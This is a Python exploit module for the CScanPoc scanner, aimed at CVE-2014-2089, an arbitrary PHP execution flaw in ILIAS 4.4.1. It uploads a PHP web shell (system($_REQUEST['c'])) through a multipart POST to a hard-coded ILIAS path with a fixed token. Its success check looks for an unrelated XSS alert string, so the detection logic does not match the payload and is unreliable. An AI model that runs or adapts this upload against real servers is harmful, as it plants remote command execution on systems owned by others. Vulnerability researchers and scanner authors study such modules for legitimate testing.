# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ILIAS_0002_L'  # 平台漏洞编号，留空
    name = 'ILIAS任意PHP代码执行漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-03-05'  # 漏洞公布时间
    desc = '''
        ILIAS是一款基于WEB的教学管理系统。

        ILIAS任意PHP代码执行漏洞。由于ILIAS未能正确过滤Email附件数据，允许远程攻击者利用漏洞提交特殊Email执行任意PHP代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-01473'  # 漏洞来源
    cnvd_id = 'CNVD-2014-01473'  # cnvd漏洞编号
    cve_id = 'CVE-2014-2089'  # cve编号
    product = 'ILIAS'  # 漏洞应用名称
    product_version = '4.4.1版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '75219d63-4cf9-4075-bc5a-274a23c1b774'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/k/cms/ilias/ilias.php?wsp_id=41&new_type=file&cmd=post&cmdClass=ilobjfilegui&cmdNode=mw:my:jh&baseClass=ilPersonalDesktopGUI&fallbackCmd=uploadFiles&rtoken=2e4e8af720b2204ea51503ca6388a325'
            data = '''
                -----------------------------1761332042190
                Content-Disposition: form-data; name="title"

                phpinfo.php
                -----------------------------1761332042190
                Content-Disposition: form-data; name="description"


                -----------------------------1761332042190
                Content-Disposition: form-data; name="extract"

                0
                -----------------------------1761332042190
                Content-Disposition: form-data; name="keep_structure"

                0
                -----------------------------1761332042190
                Content-Disposition: form-data; name="upload_files"; filename="phpinfo.php"
                Content-Type: application/octet-stream

                <?php system($_REQUEST['c']); ?>
                -----------------------------1761332042190--
            '''
            url = self.target + payload
            r = requests.post(url, data=data)

            if "<img/src='x'/onerror=alert(9999)>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
